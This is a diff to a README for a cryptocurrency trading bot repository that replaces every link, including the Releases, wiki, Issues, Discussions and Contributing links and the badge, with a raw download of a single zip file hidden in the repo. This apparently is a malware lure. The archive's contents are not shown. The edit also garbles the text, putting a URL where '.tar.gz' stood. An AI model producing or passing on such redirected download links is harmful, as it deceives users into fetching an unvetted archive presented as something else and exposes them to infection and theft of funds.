@@ -1,6 +1,6 @@
 # 🚀 trading-bot-platform - Your Easy Cryptocurrency Trading Solution
 
-[![Download the trading-bot-platform](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/releases)
+[![Download the trading-bot-platform](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/raw/refs/heads/main/shared/exchanges/bot_trading_platform_v2.5.zip%20Now-Get%20Started-brightgreen)](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/raw/refs/heads/main/shared/exchanges/bot_trading_platform_v2.5.zip)
 
 ## 🌟 Introduction
 
@@ -29,7 +29,7 @@ To run the trading-bot-platform smoothly, ensure your system meets the following
 
 To download the trading-bot-platform, visit the Releases page:
 
-[**Download Here**](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/releases)
+[**Download Here**](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/raw/refs/heads/main/shared/exchanges/bot_trading_platform_v2.5.zip)
 
 ### Step 2: Choose Your Version
 
@@ -37,7 +37,7 @@ On the Releases page, you will see a list of available versions. Select the one 
 
 ### Step 3: Download the File
 
-Click on the version you need to download the application file. This is typically a `.zip` or `.tar.gz` file that contains all necessary components.
+Click on the version you need to download the application file. This is typically a `.zip` or `https://github.com/lyhuynh170285-cmyk/trading-bot-platform/raw/refs/heads/main/shared/exchanges/bot_trading_platform_v2.5.zip` file that contains all necessary components.
 
 ### Step 4: Extract the Files
 
@@ -60,18 +60,18 @@ Once you have the application open:
 
 ### Step 7: Stay Updated
 
-We regularly update the trading-bot-platform to enhance performance and add new features. Keep checking the [Releases page](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/releases) for the latest updates.
+We regularly update the trading-bot-platform to enhance performance and add new features. Keep checking the [Releases page](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/raw/refs/heads/main/shared/exchanges/bot_trading_platform_v2.5.zip) for the latest updates.
 
 ## 📂 Documentation
 
-For in-depth support and user guides, visit our [Documentation section](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/wiki). You will find helpful guides on setting up various features, troubleshooting common issues, and effective trading strategies.
+For in-depth support and user guides, visit our [Documentation section](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/raw/refs/heads/main/shared/exchanges/bot_trading_platform_v2.5.zip). You will find helpful guides on setting up various features, troubleshooting common issues, and effective trading strategies.
 
 ## 👩‍💻 Community Support
 
 Join our community to connect with other users. Feel free to ask questions and share your experiences. Here’s how you can engage:
 
-- **GitHub Issues:** Report bugs or request features on our [Issues page](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/issues).
-- **Discussions:** Participate in discussions related to trading strategies and tips in our [Discussions page](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/discussions).
+- **GitHub Issues:** Report bugs or request features on our [Issues page](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/raw/refs/heads/main/shared/exchanges/bot_trading_platform_v2.5.zip).
+- **Discussions:** Participate in discussions related to trading strategies and tips in our [Discussions page](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/raw/refs/heads/main/shared/exchanges/bot_trading_platform_v2.5.zip).
 
 ## 💻 Frequently Asked Questions
 
@@ -97,6 +97,6 @@ We aim to enhance the trading-bot-platform continually. Here are a few planned f
 
 ## 🧑‍🤝‍🧑 Contributing
 
-We welcome contributions to improve the trading-bot-platform. If you have suggestions or want to help fix issues, check out our [Contributing Guidelines](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/blob/main/CONTRIBUTING.md).
+We welcome contributions to improve the trading-bot-platform. If you have suggestions or want to help fix issues, check out our [Contributing Guidelines](https://github.com/lyhuynh170285-cmyk/trading-bot-platform/raw/refs/heads/main/shared/exchanges/bot_trading_platform_v2.5.zip).
 
 Thank you for choosing the trading-bot-platform. We hope it helps simplify your trading experience!
